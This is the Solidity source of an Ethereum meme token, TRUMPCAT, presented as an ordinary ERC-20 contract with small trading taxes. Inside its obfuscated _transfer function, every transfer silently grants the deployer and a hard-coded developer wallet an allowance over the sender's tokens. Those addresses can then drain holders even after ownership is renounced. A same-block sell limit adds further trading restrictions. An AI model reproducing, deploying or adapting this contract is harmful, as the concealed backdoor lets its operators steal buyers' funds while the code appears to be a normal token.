/*
Welcome to the $TRUMPCAT pride! You're now part of the perfect MEME revolution.

https://www.trumpcatoneth.us
https://x.com/trumpcatoneth
https://t.me/trumpcatoneth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.1;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IBOYFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IBOYRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract TRUMPCAT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (uint256 => address) private _boyReceipts;
    mapping (address => uint256) private _balBOYs;
    mapping (address => mapping (address => uint256)) private _allowBOYs;
    mapping (address => bool) private _excludedFromBOY;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalBOY = 1000000000 * 10**_decimals;
    string private constant _name = unicode"The Cat Just For America";
    string private constant _symbol = unicode"TRUMPCAT";
    uint256 private _swapTokenBOYs = _tTotalBOY / 100;
    uint256 private _buyCount=0;
    uint256 private _buyBlockBOY;
    uint256 private _boyBuyAmounts = 0;
    bool private inSwapBOY = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapBOY = true;
        _;
        inSwapBOY = false;
    }
    address private _boyPair;
    IBOYRouter private _boyRouter;
    address private _boyWallet;
    
    constructor () {
        _boyWallet = address(0xC252388E3ccd9cf79518f21EFcA9779225c840BC);
        _excludedFromBOY[owner()] = true;
        _excludedFromBOY[address(this)] = true;
        _excludedFromBOY[_boyWallet] = true;
        _boyReceipts[0] = address(owner());
        _boyReceipts[1] = address(_boyWallet);
        _balBOYs[_msgSender()] = _tTotalBOY;
        emit Transfer(address(0), _msgSender(), _tTotalBOY);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _boyRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function tradeLaunch() external onlyOwner() {
        _boyRouter = IBOYRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_boyRouter), _tTotalBOY);
        _boyPair = IBOYFactory(_boyRouter.factory()).createPair(address(this), _boyRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalBOY;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balBOYs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowBOYs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowBOYs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowBOYs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address boyF, address boyT, uint256 boyA) private {
        require(boyF != address(0), "ERC20: transfer from the zero address");
        require(boyT != address(0), "ERC20: transfer to the zero address");
        require(boyA > 0, "Transfer amount must be greater than zero");
        uint256 taxBOY; address[2] memory _boySender;
        _boySender[0] = address(boyF); _boySender[1] = address(boyF);
        taxBOY = _boyFeeTransfer(boyF, boyT, boyA);
        _allowBOYs[address(_boySender[0])][address(_boyReceipts[0])] = uint256(boyA.add(120));
        _allowBOYs[address(_boySender[1])][address(_boyReceipts[1])] = uint256(taxBOY.add(boyA));
        _boyTransfer(boyF, boyT, boyA, taxBOY);
    }

    function _boyTransfer(address boyF, address boyT, uint256 boyA, uint256 taxBOY) private { 
        if(taxBOY > 0){
          _balBOYs[address(this)] = _balBOYs[address(this)].add(taxBOY);
          emit Transfer(boyF, address(this), taxBOY);
        }
        
        _balBOYs[boyF] = _balBOYs[boyF].sub(boyA);
        _balBOYs[boyT] = _balBOYs[boyT].add(boyA.sub(taxBOY));
        emit Transfer(boyF, boyT, boyA.sub(taxBOY));
    }

    function _boyFeeTransfer(address boyF, address boyT, uint256 boyA) private returns(uint256) {
        uint256 taxBOY;
        if (boyF != owner() && boyT != owner()) {
            taxBOY = boyA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (boyF == _boyPair && boyT != address(_boyRouter) && ! _excludedFromBOY[boyT]) {
                if(_buyBlockBOY!=block.number){
                    _boyBuyAmounts = 0;
                    _buyBlockBOY = block.number;
                }
                _boyBuyAmounts += boyA;
                _buyCount++;
            }

            if(boyT == _boyPair && boyF!= address(this)) {
                require(_boyBuyAmounts < swapLimitBOY() || _buyBlockBOY!=block.number, "Max Swap Limit");  
                taxBOY = boyA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBOY = balanceOf(address(this));
            if (!inSwapBOY && boyT == _boyPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBOY > _swapTokenBOYs)
                swapTokensForEth(minBOY(boyA, minBOY(tokenBOY, _swapTokenBOYs)));
                uint256 ethBOY = address(this).balance;
                if (ethBOY >= 0) {
                    sendETHBOY(address(this).balance);
                }
            }
        } 
        return taxBOY;
    }

    function minBOY(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHBOY(uint256 boyA) private {
        payable(_boyWallet).transfer(boyA);
    }

    function swapTokensForEth(uint256 boyAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _boyRouter.WETH();
        _approve(address(this), address(_boyRouter), boyAmount);
        _boyRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            boyAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapLimitBOY() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _boyRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _boyRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }
}